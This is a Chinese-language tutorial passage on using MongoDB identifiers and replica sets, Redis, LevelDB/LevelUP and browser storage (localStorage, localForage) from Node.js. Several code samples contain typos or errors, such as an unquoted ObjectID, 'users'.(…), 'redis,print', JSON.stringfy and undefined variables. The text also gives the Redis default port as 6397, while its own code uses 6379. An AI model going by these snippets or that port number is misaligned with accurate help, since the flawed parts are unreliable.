&#125;) &#125;)&#125;); 使用 MongoDB 标识MongoDB 的标识是二进制 JSON （BSON）格式的。文档上的 _id 是一个 JavaScript 对象，其内部封装了 BSON 格式的 objectID。BSON 格式是文档在 MongoDB 内部的表示和传输格式，它比 JSON 的空间利用率高，解析速度快，也就是说可以用更低的带宽达成更快的数据库交互。 BSON 格式的 ObjectID 并不是随机的字节序列，它编码了ID 何时在何处生成的元数据。比如 ObjectID 的前四个字节，它们是时间戳。因此文档中没有必要再单独保存一个 createdAt 时间戳： 123const id = new ObjectID(61bd7f57bf1532835dd6174b); // getTimestamp 返回 JavaScript 日期： 2016-07-08T14:49:05.000Zid.getTimestamp(); ObjectID 格式的更多信息 在终端输出是，ObjectID 表面上看起来可能像字符串一样，但实际上是对象。所以在进行比较，解释器会报告说两个看起来完全一样的值是不同的，因为它们是指向不同对象的引用值。这就是典型的对象比较陷阱。 下面的代码两次提取相同的对象。我们试图用 Node 自带的 assert 模板断言这两个 ID 或者说对象是相对的，结果却失败了： 1234567891011121314const &#123; MongoClient &#125; = require('mongodb');const assert = require('assert')MongoClient.connect('mongodb://localhost:27017/articles') .then(db =&gt; &#123; console.log('Client ready'); const Articles = db.collection('articles') Articles.find().toArray().then(articles =&gt; &#123; const article1 = articles[0]; return Articles.findOne().then(article2 =&gt; &#123; assert.equal(article1._id, article2._id); db.close(); &#125;) &#125;) &#125;) ObjectID 有个 equal 方法，所有的 _id 都可以用这个方法判断它们是否相等。另外，你也可以将标识强制转换为字符串进行比较，或者用 assert 模块的 deepEquals 方法 123article1._id.equals(article2._id); String(article1._id) === String(article2._id); assert.deepEqual(article1._id, article2._id); 传给 mongodb 驱动的标识必须是 BSON 格式的 ObjectID。ObjectID 构造器可以将字符串转换成 ObjectID： 123const &#123; ObjectID &#125; = require('mongodb'); const stringID = '577f6b45549a3b991e1c3c18'; const bsonID = new ObjectID(stringID); 要尽可能保持 BSON 格式。在 BSON 和字符串之间的相互转换会以牺牲性能为代价，这违背了 MongoDB 把 BSON 格式的标识交给客户端的初衷。请参阅 BSON 官网了解 BSON 格式的详细信息。 使用复制集MongoDB 的分布式功能，多个 mongod 进程可以作为复制集的节点/成员运行。复制集是由一个主节点和无数从节点组成的。复制集中的每个成员都会分到唯一的端口和目录存储自己的数据。各个实例不能共享端口和目录，并且在启动之前这些目录必须是已经存在了。 下面代码为每个成员创建唯一的目录，并从端口 27017 开始按顺序启动它们。如果不想让 mongod 在后台运行（命令中不带 &amp;），可以为每个 mongod 命令开一个新的终端标签。 启动一个复制集 12345678mkdir -p ./mongodata/db0 ./mongodata/db1 ./mongodata/db2 // 确保没有其他 mongod 实例运行pkill mongod// 让已有实例有时间关停sleep 3mongod --port 27017 --dbpath ./rs0-data/db0 --replSet rs0 &amp; mongod --port 27018 --dbpath ./rs0-data/db1 --replSet rs0 &amp; m 复制集跑起来之后，MongoDB 需要执行一些初始化操作。你需要连接到希望让它做主节点的那个实例（默认是 27017），并像下面这样调用 rs.initiate()。然后把这些实例作为成员添加到复制集中。注意要提供所连机器的主机名。 1234mongo --eval "rs.initiate()" mongo --eval "rs.add('`hostname`:27017')"mongo --eval "rs.add('`hostname`:27018')" mongo --eval "rs.add('`hostname`:27019')" 在建立连接时，MongoDB 客户端需要知道所有的复制集成员，但并不要求所有成员都在线。连上之后就可以照常使用了。 创建复制集 1234567891011121314151617const os = require('os'); const &#123; MongoClient &#125; = require('mongodb'); const hostname = os.hostname(); const members = [ `$&#123;hostname&#125;:27018`, `$&#123;hostname&#125;:27017`, `$&#123;hostname&#125;:27019` ]; // test 是数据库名；rs0是复制集的名称MongoClient.connect(`mongodb://$&#123;members.join(',')&#125;/test?replSet=rs0`).then(db =&gt; &#123; // replSetGetStatus会输出复制集的成员信息和元数据 db.admin().replSetGetStatus().then(status =&gt; &#123; console.log(status); db.close(); &#125;); &#125;); 即便有节点崩溃，但只要仍在运行的 mongod 节点不少于两个，系统就能继续工作。如果主节点崩溃了，系统会自动推举一个从节点升为主节点。 了解写关注在使用 MongoDB 时，开发人员能够对性能和安全上的折中选项做精细的控制，以满足程序不同区域的需要。要想不出意外，必须掌握 MongoDB 的写关注和读关注这两个概念，特别是在复制集中的节点不断增多时。 写关注本质上是个数量值，表明 MongoDB 在返回操作整体成功的响应之前，需要把数据成功写入多少个 mongod 实例。如果不特别指明，写关注的默认值是 1，即确保数据成功写入至少一个节点。对于重要数据而言，这样的保证水平是不够的。如果在数据复制到其他节点之前，这个节点下线了，那数据可能就丢了。 从程序角度来说，实际上是经常希望把写关注设为0，即程序根本不想为 MongoDB 的响应而等待： 1db.collection('data').insertOne(data,&#123;w:0&#125;); 写关注为0时性能水平达到最高，但同时耐用性保证降到最低，一般只在临时或不重要的数据上使用（比如写日志或缓存） 在连到复制集上时，写关注可以大于1，把数据复制到更多节点上可以降低其丢失的风险，但代价是操作延时会更长 12db.collection('data').insertOne(data,&#123;w:2&#125;);db.collection('data').insertOne(data,&#123;w:5&#125;); 写关注也可以随着集群中节点数量的变化而变化，当写关注被设为 majority 时，MongoDB 能自行动态调整它的值。此时数据一定会写入至少 50% 的可用节点： 1db.collection('data').insertOne(data,&#123;w:'majority'&#125;); 默认值的写关注1可能无法保证重要数据的安全。如果在数据复制到其他节点之前，这个节点下线了，那数据可能就丢了。 写关注大于1时，可以确保在继续操作之前数据会写入多个 mongodb 实例上。在同一台机器上运行多个实例确实可以提高数据的安全性，但出现系统性故障时，比如硬盘空间或RAM 耗光了，这样的配置是无济于事的。如果把节点分布在多台机器上，并确保写入操作会传播到这些节点上时，可以保证数据不受机器故障的影响，但同样，整个数据中心都出现问题就不行了，并且写操作会更慢。把节点部分到多个数据中心可以保证数据不受数据中心级故障的影响，但将数据复制到多个数据中心性能影响非常大。 保障越多，系统越慢，也越复杂。不仅 MongoDB 如此，所有数据存储都这样。没有完美的解决方案，你需要决定将程序各部分的风险水平控制在什么范围内 键/值存储键/值存储中的所有记录都是由一个键值对构成的。大多数键/值 系统都不对值的数据类型、长度和结构做限制。在键/值数据库看来，值是不透明的原子：数据库不知道，或者说不关心值的数据类型，并且值作为一个整体，不会切分或访问其中的部分数据。在关系型数据库中，数据一行行地存在表中，每一行都被分成了预先定义好的列。但键/值存储跟它相反。其把管理数据格式的任务交给了应用程序。 键/值存储经常出现在程序性能的关键路径上。理想情况下，值应该是按照用最少的读取次数完成任务的标准来摆放的。相较于其他数据库来说，键/值存储的查询功能比较简单。复杂查询最好是预先计算好的。否则应该放在程序里，而不是交给数据库执行。有了这样的限制，数据库的性能特征就更容易理解和预测了。 像Redis 和 Memcached 这些最火的键/值存储经常用来做易失性存储（进程退出后数据就没了）。避免写盘操作是提升性能的最佳方式。如果数据可以重新生成，或者丢了也没有太多关系，这种折中是可以接受的，比如作为缓存和存储用户会话数据。 RedisRedis 是热门的结构化内存数据库，尽管很多人认为 Redis 是键/值 存储，但实际上键和值都是 Redis 所支持的众多数据结构中的一种，它还支持很多实用的基础结构。 Redis 原生支持的数据结构包括： 字符串 散列表 列表 集合 有序表 Redis 还有很多实用的功能： 位图数据——直接在值上进行位操作 地理位置索引——存储带半径查询的地理位置数据 频道——一种发布/订阅数据传递机制 TTL——数据可以有过期时间，过期之后自动清除 LRU逐出——有选择地移除最近不用的数据，以便维持内存的利用率 HyperLogLog——用很低的内存占用求集合基数的高性能算法（不需要存储所有成员） 复制、集群和分区——水平扩展和数据耐用性 Lua脚本——可以用 Redis 添加自定义的命令 Redis 真的是一个超强的多面手，http://redis.io/commands 上有更详细的介绍。 安装和配置可以用系统上的包管理工具安装 Redis。 1npm i redis 用可执行文件 redis-server 启动服务器： 1redis-server /usr/local/etc/redis.conf 服务器默认的监听端口是 6397。 初始化Redis 客户端实例使用 redis npm 包的 createClient 函数创建的： 12const redis = require('redis');const db = redis.createClient(6379, '127.0.0.1'); 这个函数以端口和服务器的主机地址为参数。如果 Redis 运行在本机的默认端口上，则无须提供参数： 1const db = redis.createClient(); 因为 Redis 客户端实例是一个 EventEmitter，所以我们可以通过它监听各种 Redis 状态事件。不用等着连接准备好再向客户端发送命令，这些命令会缓存到连接就绪。 连接到 Redis 监听状态事件 12345const redis = require('redis');const db = redis.createClient();db.on('connect', () =&gt; console.log('Redis client connected to server.'));db.on('ready', () =&gt; console.log('Redis server is ready'));db.on('error', err =&gt; console.log('Redis error', err)); 出现连接或客户端方面的问题时会触发错误处理器。如果发生了 error 事件，但没有监听该事件的错误处理器，程序会抛出错误然后退出。Node 中的所有 EventEmitter 都是这样的。如果连接失败后有错误处理器，Redis 客户端会尝试重新连接。 处理键/值对Redis 可以当做普通的键/值存储用，支持字符串和任何二进制数据。分别用 get 和 set 方法读写键/值对： 1234567db.set('color','red',err=&gt;&#123; if(err) throw err;&#125;);db.get('color',(err,value) =&gt;&#123; if (err) throw err; console.log('Got：',value);&#125;); 如果写入的键已经存在，那么原来的值会被覆盖掉。如果读取的键不存在，则会得到值 null，而不会被当做错误。 下面这些命令是用来获取和处理值的： append decr decrby get getrange getset incr incrby incrbyfloat mget mset msetnx psetex set setex setnx setrange strlen 处理键exists 可以检查某个键是否存在，它能接受任何数据类型： 1234db.exists('users'.(err,doseExist) =&gt;&#123; if(err) throw err; console.log('users exists:',doesExist);&#125;); 除了 exists，下面这些命令都可以用在键上，任何类型的值都可以（这些命令可以接受字符串、集合、列表等类型） del exists rename renamex sort scan type 编码与数据类型在 Redis 服务器里面。键和值是二进制对象，跟传给客户端时所用的编码没关系。所有有效的 JavaScript 字符串（UCS2/UTF16）都是有效的键或值： 1234db.set('greeting','你好',redis.print);db.get('greeting',redis.print);db.set('icon','?',redis.print);db.get('icon',redis.print); 默认情况下，在写入时会将键和值强制转换成 字符串。比如说，如果设定某个键的值是数字，那么读取这条记录时，得到的键将会是个字符串： 1234567db.set('colors',1,(err) =&gt;&#123; if(err) throw err;&#125;);db.get('colors',(err,value)=&gt;&#123; if(err) throw err; console.log(('Got: %s as %s', value, typeof value);&#125;); Redis 客户端会默默将数字、布尔值和日期转换成字符串，它也乐意接受缓冲区对象。除此之外，设定其他任何 JavaScript 类型（比如对象、数字、正则表达式）的值时，客户端都会发出一个不应被忽略的警告： 12db.set('users',&#123;&#125;,redis.print);// Deprecated: The SET command contains a argument of type Object. This is converted to "[object Object]" by using .toString() now and will return an error from v.3.0 on. Please handle this in your code to make sure everything works as you intended it to. 将来这会变成错误，所以一定要让程序确保传给 Redis 客户端的数据类型是正确的 1.陷阱：单值和多值数组 如果值是包含多个值的数组，那么客户端会报一个很神秘的错误，即“ReplyError：ERR syntax error”： 1db.set('users', ['Alice', 'Bob'], redis.print); 但如果数组中只有一个值，则不会报错 12db.set('user', ['Alice'], redis.print); db.get('user', redis.print); 2. 带缓冲区的二进制数据 Redis 可以存储任何二进制数据，也就是说它可以存储任何类型的数据。Node 客户端对这一功能的支持是用 Node 的 Buffer 类型实现的。当 Redis 客户端收到缓冲区类型的键或值时，会原封不动地将这些字节发给 Redis 服务器。为了避免可能会出现的数据破坏或性能损失，客户端不会进行缓冲区和字符串之间的类型转换比如说，如果要把硬盘或网络上的数据直接写到 Redis中，那么直接写缓冲区里的数据明显会比先把数据转成字符串再写更高效。 缓冲区：缓冲区是 Node 核心文件和网络 API 默认提供的结果。它们是二进制数据连续块的容器，在 JavaScript 还没有自己的原生二进制数据类型（Unit8Array,Float32Array 等）时就已经在 Node 中了。现在它是 Unit8Array 的特殊子类。Buffer API 在 Node 中是可以全局访问的，用它不需要 require 任何东西。 Redis 最近添加了一些操作字符串上单个位的命令，在处理缓冲区时也可以用： bitcount bitfield bitop setbit bitpos 使用散列表散列表是键/值对的数据集。hmset 命令的参数是一个键和一个表示散列键/值对的对象。hmget 可以读出这个包含键/值对的对象。代码如下 123456789101112131415// 设定散列表键/值对db.hmset('camping', &#123; shelter: '2-person tent', cooking: 'campstove'&#125;, redis.print)// 获取camping.cooking 的值db.hmget('camping', 'cooking', (err, value) =&gt; &#123; if (err) throw err; console.log('Will be cooking with:', value);&#125;);// 以数组形式获取散列键db.hkeys('camping',(err,keys)=&gt;&#123; if(err) throw err; keys.forEach(key =&gt; console.log(` $&#123;key&#125;`));&#125;); Redis 散列表中不能存储带嵌入结构的对象，只能有一层。 下面这些是操作散列表的命令： hdel hexists hget hset hgetall hincrby hincrbyfloat hkeys hmget hmset hset hsetnx hstrlen hvals hscan 使用列表列表是包含字符串值的有序数据集，可以存在同一值的多个副本。列表在概念上跟数组类似。最好当做是栈（LIFO:后进先出）或队列（FIFO：先进先出）来用。 下面的代码演示了如何将值存到列表中然后读取出来。 lpush 命令向列表中添加一个值。lrange 命令按范围读取，有起始和结束索引。因为-1表示列表中的最后一个元素，所以下例中的 lrange 会取出列表中的所有元素。 12345678client.lpush('tasks','Paint the bikeshed red',redis.print);client.lpush('tasks','Paint the bikeshed green'.redis.print);client.lrange('tasks',0,-1,(err,items) =&gt;&#123; if(err) throw err; items.forEach(item =&gt;&#123; console.log(` $&#123;item&#125;`); &#125;);&#125;); 列表既没有提供确定某个值是否存在其中的方法，也没有提供确定某个值的索引的方法。我们只能通过手动遍历获取这些消息，但做这件事效率很低，应该尽量避免，如果你确实需要这样的功能，应该考虑使用其他数据结构，比如集合，甚至可以跟列表配合使用。为了充分利用各种功能特性，把数据复制到多个数据结构中是正常的。 操作列表的命令： blpop brpop lindex llen lpop lpush lpushx lrange lrem lset ltrim rpop rpush rpushx 使用集合 集合时无序数据集，其中不允许有重复值，集合是一种高性能的数据结构，检查成员、添加和移除记录都可以在 O(1)时间内完成，所以其非常适合对性能要求比较高的任务: 1234567db.sadd('admins','Alice',redis,print);db.sadd('admins','Bob',redis,print);db.sadd('admins','Alice',redis,print);db.smembers('admins',(err,members) =&gt;&#123; if(err) throw err; console.log(members);&#125;); 下面这些是操作集合的命令： sadd scard sdiff sdiffstore sinter sinterstore sismember smembers spop srandmember sunion sunionstore sscan 用频道实现发布/订阅功能Redis 不仅仅是传统意义上的数据存储系统，它还提供了频道，频道是可以实现发布/订阅功能的数据传输机制。聊天和博彩等实时程序都需要这样的功能。 Redis 客户端既可以订阅频道上的消息，也可以向频道发布消息。发给频道的消息会传递给所有订阅频道的客户端。发布者不需要知道谁是订阅者，订阅者也不知道发布者是谁。将发布者和订阅者解耦是种强大清晰的模式。 下面的例子用 Redis 的发布/订阅功能实现的聊天服务器 1234567891011121314151617181920212223242526const net = require('net');const redis = require('redis');// 为每个连接到聊天服务器的用户定义的配置逻辑const server = net.createServer(socket =&gt; &#123; // 为每个用户创建订阅客户端 const subscriber = redis.createClient(); subscriber.subscribe('main'); // 从频道收到消息后显示给用户看 subscriber.on('message', (channel, message) =&gt; &#123; socket.write(`Channel $&#123;channel&#125;：$&#123;message&#125;`); &#125;); // 为每个用户创建发布客户端 const publisher = redis.createClient(); // 用户输入消息后，发布它 socket.on('data', data =&gt; &#123; publisher.publish('main', data); &#125;); socket.on('end', () =&gt; &#123; // 如果用户断开了连接，结束订阅客户端 subscriber.unsubscribe('main'); subscriber.end(true); publisher.end(true); &#125;);&#125;);server.listen(3000); 提高性能npm 包 hiredis 是从 JavaScript 到官方 Hiredis 的 C 语言库的本地绑定。Hiredis 能显著提 Node Redis 程序的性能，特别是在大型数据库上使用 sunion、sinter、lrange 和 zrange 这些操作时. 只要装好 hiredis，redis 包下次启动时就会自动检测到 hiredis，然后自动使用： 1npm install hiredis --save hiredis 几乎没什么缺点，但因为它是从 C 代码编译来的，所以在某些平台上构建 hiredis 可能会受到一些限制，或者比较复杂。跟所有本地添加包一样，升级 Node 后可能需要用 npm rebuild 重新构建 hiredis 嵌入式数据库使用嵌入式数据库时不需要安装或管理一个外部服务器，它是嵌入在程序进程里运行的。程序一般通过直接的过程调用跟嵌入式数据库通信，不需要通过进程间通信（IPC）通道或网络。 因为很多时候程序要做成自包含的，所以只能选嵌入式数据库（比如移动端或桌面程序），嵌入式数据库也可以用在 Web 服务器上，经常用来实现高吞吐性的功能，比如用户会话或缓存，有时甚至会作为主存储。 Node 和 Electron 程序中常用的嵌入式数据库有： SQLite LevelDB Aerospike EJDB NeDB LokiJS Lowdb NeDB、LokiJS 和 Lowdb 都是用纯 JavaScript 写的，天生就适合嵌入到 Node 和 Electron 程序中。尽管有 SQLite 这样著名的可嵌入式关系型数据库，但大多数嵌入式数据库都是简单的键/值 或文档存储。 LevelDBLevelDB 是 Google 在 2011 年初开发的嵌入式持久化键/值存储，最开始是要给 Chrome 里实现的 IndexedDB 做后台存储的。LevelDB 的设计理念源于 Google 的 Bigtable 数据库。它的竞争对手是 Berkley DB、Tokyo/Kyoto Cabinet 和 Aerospike 这些数据库，可以把它当作最小功能集的嵌入式 Redis。跟大多数嵌入式数据库一样，LevelDB 也不是多线程的，不支持使用同一个底层文件存储的多实例，所以无法脱离程序的封装分布式使用。 LevelDB 中的键是按字典顺序排好序的，值是用 Google 的 Snappy 压缩算法压缩过的。跟Redis 之类的内存数据库不同，LevelDB 总是把数据写到硬盘上，所以总的数据容量不受机器内存的限制。 LevelDB 只提供了几个一看就明白的操作命令：Get、Put、Del 和 Batch。LevelDB 还能用快照捕获当前的数据库状态，创建能在数据集上前后移动的双向循环器。创建循环器也会隐含着创建快照，后续写操作无法改变循环器见到的数据。 LevelDB 还形成了一些支脉，演化出了其他一些数据库。由于有数量众多的支脉，LevelDB自身反而可以变得越来越简单： Facebook 的 RocksDB Hyperdex 的 HyperLevelDB Basho 的 Riak Mojang（Minecraft 的创作者）的 leveldb-mcpe 用于比特币项目的 bitcoin/leveldb LevelUP 与 LevelDOWN Node 中对 LevelDB 提供支持的是 LevelUP 和 LevelDOWN 包。LevelDOWN 用 C++简单直白地将 LevelDB 绑定到 Node上，我们不太可能直接跟它交互。LevelUP 对 LevelDOWN 的 API 做了封装，为我们提供了更方便、也更习惯的 Node 接口。LevelUP 还增加了一些功能，包括键/值编码、JSON、等待数据库打开的写缓存，以及将 LevelDB 循环器接口封装在了 Node 流中。 安装在 Node 程序中使用 LevelDB 最方便的地方就是它是嵌入式的：所有需要的东西都可以用 npm 安装。不需要安装任何额外的软件。 1npm install level -S level 包里封装了 LevelUP 和 LevelDOWN，提供了预先配置好用 LevelDOWN 做后台的LevelUP API。level 提供的 LevelUP API 在 LevelUP 的介绍文件里 API 概览LevelDB 客户端存储和获取数据的主要方式如下： db.put(key,value,callback)——存储键值对 db.get(key,callback)——获取指定键的值 db.del(key,callback)——移除指定键的值 db.batch().write()——执行指定键的值 db.batch().write()——执行批处理 db.createKeyStream(options)——创建数据库中键的流 db.createValueStream(options)——创建数据库中值的流 初始化初始化 level 需要提供一个存储数据的路径，如果指定的目录不存在，则会自动创建，人们一般会用 .db 做这个目录的后缀。 初始化 level 数据库 1234const level = require('level')const db = level('./app.db', &#123; valueEncoding: 'json'&#125;); 调用过 level（） 后，返回的 LevelUP实例可以马上接受命令，以同步方式执行。在 LevelDB 存储打开之前发出的命令会缓存起来，一直等到存储打开。 键/值编码因为 LevelDB 中的键和值可以是任何类型的数据，所以程序要负责处理数据的序列化和反序列化。可以将 LevelUP 配置为直接支持下面这些数据类型： utf8 json binary id hex ascii base64 ucs2 utf16le 键/值默认都是 UTF-8 的字符串。上面代码中，键仍然是 UTF-8 字符串，但值是用JSON 编码/解码的。经过 JSON 编码后，在某种程序上来讲，对象或数组这样的结构化数据的存储和获取都可以用 MongoDB 那样的文档存储一样了。但并不像真正的文档存储，LevelDB 没有办法读取值里面的键，值是不透明的。用户也可以用自己定制的编码，比如说想 MessagePack 这样的结构化数据形态。 键/值对的读写核心 API 很简单：用 put(key,value)写，用 get(key) 读，用 del(key)删除。 1234567891011121314151617181920const level = require('level')const db = level('./app.db', &#123; valueEncoding: 'json'&#125;);const key = 'user';const value = &#123; name: 'Alice'&#125;db.put(key, value, err =&gt; &#123; if (err) throw err; db.get(key, (err, result) =&gt; &#123; if (err) throw err; console.log('got value:', value); db.del(key, (err) =&gt; &#123; if (err) throw err; console.log('value was deleted'); &#125;); &#125;);&#125;); 如果把值放到已经存在的键上，旧值会被覆盖。当视图读取的键不存在时会发生错误。错误对象的类型是 NotFoundError,还有个特殊的属性 err.notFound,可以把它跟其他错误区分开。大部分数据库一般不会将其作为错误，但因为 LevelDB 没有提供检查某个键是否存在的地方，所以 LevelUP 需要区分不存在的值和未定义的值。与 get 不同，del 不存在的键不会报错。 12345db.get('this-key-does-not-exist',(err,value)=&gt;&#123; if(err &amp;&amp; !err.notFound) throw err; if(err &amp;&amp; err.notFound) return console.log('Value was not found'); console.log('Value was found:',value);&#125;); 所有的数据读写操作都可以通过一个可选的参数改变当前操作的编码， 1234567db.put(new Uint8Array([1, 2, 3]), '0xFF0099', options, (err) =&gt; &#123; if (err) throw err; db.get(new Uint8Array([1, 2, 3]), options, (err, value) =&gt; &#123; if (err) throw err; console.log(value); &#125;);&#125;); 可插拔的后台把 LevelUP/LevelDOWN 分开还有个好处，LevelUP 可以用其他数据库做存储后台。所有能用 MemoDown API 封装的东西都可以变成 LevelUP 的存储后台，从而允许你用完全相同的 API 跟这些数据存储交互。 下面这些数据库都可以做 LevelUP 的存储后台： MySQL Redis MongoDB JSON 文件 Google 电子表格 AWS DynamoDB Windows Azure 表存储 浏览器 Web 存储（IndexedDB/localStorage） 拥有了这种可以轻松切换存储介质，甚至可以编写自己的存储后台的功能，我们就可以用一套数据库 API 应对各种情况和环境，用一套数据库 API 掌握一切。 memdown 是比较常用的后台，它把值都存在内存里，就像使用内存模式的 SQLite 一样，非常适合放在测试环境里降低测试配置和重置的成本。 安装依赖 1npm i -S levelup memdown 通过 LevelUP 使用 memdown 12345678910const level = require('levelup')const memdown = require('memdown');// 对于 memdown 来说，这里的路径可以是任意字符串，因为它根本不需要硬盘const db = level('./level-articles.db', &#123; keyEncoding: 'json', valueEncoding: 'json', // 唯一的区别是将db参数设定为 memdown db: memdown&#125;); 上面的例子用了之前的 level 包，因为它只是 LevelUP 的封装，但如果你不想用 level 中的 LevelDOWN ，可以直接用 LevelUP,以免因为 LevelDOWN 形成了对 LevelDB的依赖。 模块化数据库下面是一些可以通过 npm 包实现的 LevelDB 模块化功能： 原子更新 自增长的键 地址位置查询 实时更新流 LRU 逐出 Map/reduce 任务 主/主复制 主/从复制 SQL 查询 二级索引 触发器 版本化数据 昂贵的序列化和反序列化JSON 操作是昂贵的阻塞式操作。在进程将数据装进 JSON ，或从 JSON 中取出数据时，根本做不了别的事情。大多数序列化格式都是如此。所以序列化操作一般都是 Web 服务器上的瓶颈。要想降低影响，最好的方法就是减少这种操作的频率和要处理的数据量。 改变序列化格式（比如 MessagePack 或 Protocol Buffer）可能会加快处理速度，但在考虑改变序列化之前，要尽可能先降低负载和优化序列化/反序列化步骤来改善性能。 JSON.stringify 和 JSON.parse 是原生函数。已经充分优化过了，但是在需要处理以兆字节为单位的数据时，还是很容易垮掉。下面例子是序列化和反序列化 10MB 数据的性能表现。 1234567891011121314const bytes = require('pretty-bytes');const obj = &#123;&#125;;for(let i = 0; i &lt; 20000; i++)&#123; obj[i] = &#123; [Math.random()]:Math.random &#125;&#125;console.log(''serialise'');const jsonString = JSON.stringfy(obj);console.timeEnd('serialise');console.log('Serialise Size:',byte(Buffer.byteLength(jsonstring)));console.log('Deserialise');const obj2 = JSON.parse(jsonString);console.log('deserialise'); 在一台装了 Node 6.2.2 的 2015 3.1GHZ Intel Core i7MacBook Pro 上，对这将近 10MB 的数据，序列化几乎用了 140 毫秒，反序列化用了 335 毫秒。这样的负载放到 Web 服务器上就是场灾难，因为这些步骤是阻塞式的，只能串行处理。在序列化时，这样的服务器每秒大概只能处理 7 个请求，反序列化时每秒只处理 3 个 浏览器内存储Node 采用的异步编程模型可以适用于很多场景，因为对大多数 Web 程序来说，最大的瓶颈就是 I/O 。所以利用客户端数据既可以降低服务器负载，还可以提升用户体验，这是效果最显著的做法，不用等着程序在网上跑来跑去取数据的用户会很开心。客户端存储还可以提高程序的可用性，因为即便用户或者服务掉线了，程序里有些功能还是可以用的。 Web 存储：localStorage 和 sessionStorageWeb 存储定义了简单的键/值存储，其在客户端和移动端浏览器上都有很好的支持。域可以用 Web 存储在浏览器里保存一定量的数据，即便是经过网站刷新、标签页关闭，甚至浏览器关闭后，这些数据仍然存储。Web 存储是客户端持久化的首选，简单朴素是它的优势。 有两种 Web 存储 API ,localStorage 和 sessionStorage。sessionStorage 的 API 跟 localStorage 一样，只是持久化行为不同。虽然它们存储的数据在页面重新加载之后都会得到保留，但 sessionStorage 数据只会保留到页面会话结束（标签或浏览器关闭时），并且不能在不同的浏览器窗口之间共享。 开发 Web 存储API 是为了克服浏览器 cookie 的限制。确切地说，cookie 不适合在多个活动标签间共享同一域的数据。如果用户要跨域多个标签完成一项任务，可以用 sessionStorage 保存这些标签共享的状态数据，从而省掉因网络传输带来的开销。 要保留跨越多个会话、标签和窗口的长期数据，cookie 也不好用。设计 localStorage 就是为了解决这些问题。不同的浏览器有不同的数据存储空间上限。移动端浏览器只有 5MB 的存储空间。 API 概览 localStorage API 提供的方法包括： localStorage.setItem(key,value)——存储键值对 localStorage.getItem(key)——获取指定键对应的值 localStorage.removeItem(key)——移除指定键对应的值 localStorage.clear()——移除所有键值对 localStorage.key(index)——获取指定索引处的值 localStorage.length——localStorage 中的键总数 值的读写键和值只能是字符串，如果提供的值不是字符串，会被强制转换成字符串。这种转换用的 toString。不会产生JSON 字符串。所以对象的序列化结果就是 [object object]。因为要想在 Web 存储中存放比较复杂的数据类型，只能让应用程序做转换处理。下面是在 localStorage 中存放 JSON 的例子。 12345678const examplePreferences = &#123; temperature: 'Celcius'&#125;// 写时序列化localStorage.setItem('perferences', JSON.stringify(examplePreferences));// 读取时反序列化const perferences = JSON.parse(localStorage.getItem('perferences'));console.log('Loaded preferences:', perferences); 访问 Web 存储中的数据是同步操作，也就是说执行读写操作时，Web 存储会阻塞 UI 线程，但因为 速度相当快，在工作负载比较小时，用户察觉不出来这种变化。但是，还是应该尽量避免过度读写，尤其要避免出现大量数据的读写操作。可惜 Web worker 无法访问 Web 存储，所以所有读写只能在主 UI 线程中进行。 Web 存储 API 没有查询功能，不能按范围选择键，或者搜查特定的值，只能通过键来访问数据项。如果想要实现搜索功能，只能自己维护一套索引，或者数据集非常小的话，可以进行循环遍历，下面就是对 localStorage 中的所有键进行循环遍历 12345678910111213141516function getAllKeys() &#123; return Object.keys(localStorage);&#125;function getAllKeysAndValues() &#123; return getAllKeys() .reduce((obj, str) =&gt; &#123; obj[str] = localStorage.getItem(str); return obj; &#125;, &#123;&#125;);&#125;// 得到所有的值const allValues = getAllKeys().map(key =&gt; localStorage.getItem(key))// 作为对象输出console.log(getAllKeysAndValues()); 跟大多数键/值存储一样，Web 存储中的键也只有一个命名空间。比如说，我们不能分别为 posts 和 comments 创建各自的存储。不过可以通过给键增前缀的方式创建‘命名空间’，比如下面的这样： 12localStorage.setItem(`/posts/$&#123;posts.id&#125;`, post);localStorage.setItem(`/comments/$&#123;comments.id&#125;`, comments); 获取某个命名空间中中的所有数据： 12345function getNamespaceItems(namespace) &#123; return getAllKeys().filter(key =&gt; key.startsWith(namespace));&#125;console.log(getNamespaceItems('/exampleNamespace')); 这样会循环遍历 localStorage 中所有的键，所以如果数据项比较多，要考虑一下对性能的影响。因为 localStorage API 是永不的，所以用起来限制还是比较多。比如说，对于那些以 JSON 序列化数据为参数，并返回结果也是这样的数据的函数，你可能会用 localStorage 缓存记忆（memoize）它的结果。 用 localStorage 持久化记忆 1234567891011// 以后调用时如果参数相同，可以直接返回之前记住的结果function memoizedExpensiveOperation(data) &#123; const key = `/memoized/$&#123;JSON.stringify(data)&#125;`; const memoizedResult = localStorage.getItem(key); if (memoizedResult !== null) return memoizedResult; // 完成高成本工作 const result = expensiveWork(data); // 将结果保存到 localStorage 中，以后就不用再次计算 localStorage.setItem(key, result); return result;&#125; 不过只有操作特别慢的时候，记住结果的收益才会大于序列化/反序列化处理的开销（比如加密算法）。因此最好使用 localStorage 节省因为要在网络上传输数据而开销的时间。 Web 存储确实会受到限制，但只要使用它得当。依然是简单而且强大的工具。 localForageWeb 存储的主要缺点主是它的阻塞式同步 API 和某些浏览器中有限的存储空间。除了 Web 存储，大多数浏览器都支持 WebSQL 或者是 IndexedDB，或者同时支持两种存储。它们都是非阻塞，并且存储空间比 Web 的大。 但是不建议用 Web 存储直接用。WebSQL 已经被废弃了，它的继任者是 IndexedDB,提供的 API 即不友好，也不简洁。要想在浏览器中用非阻塞的方式存储数据，可以用一种标准化的非标配工具，其中来自 Mozilla 的 localForage 库。 API 概览： localForage 的接口基本上与 Web 存储是一样的，只不过是异步非阻塞方式的： localforage.setItem(key,value,callback)——存储键值对 localforage.getItem(key,callback)——获取指定的键的值 localforage.removeItem(key,callback)——移除指定键的值 localforage.clear(callback)——移除所有的键值对 localforage.key(index,callback)——获取指定索引的值 localforage.keys(callback)——获取所有的键 localforage.iterate(iterate,callback)——循环遍历键值对 读和写localForage API 中有 promise 和回调两种方式。 localStorage 和 localForage 的数据读取 12345678910111213// localStorage 同步阻塞const value = localStorage.getItem(key);console.log(value);// localforage 使用 promise 的异步非阻塞方式localforage.getItem(key) .then(value =&gt; console.log(value));// 使用回调的异步非阻塞的方式localforage.getItem(key, (err, value) =&gt; &#123; console.log(value);&#125;); localForage 会在底层使用当前浏览器环境中最好的存储机制。如果有 IndexedDB,就使用它。否则就尝试 WebSQL,接着就是 Web 存储。这些存储的优先级是可以配置的，设置是可以禁止使用某种存储： 12// 不用 localStoragelocalforage.setDriver([localforage.INDEXEDDB, localforage.WEBSQL]); localForage 可以存储字符串之外的其他类型的数据。它支持大多数的 JS 原始类型，比如数组或者是对象，以及二进制数据类型：TypeArray、ArrayBuffer和 Blob 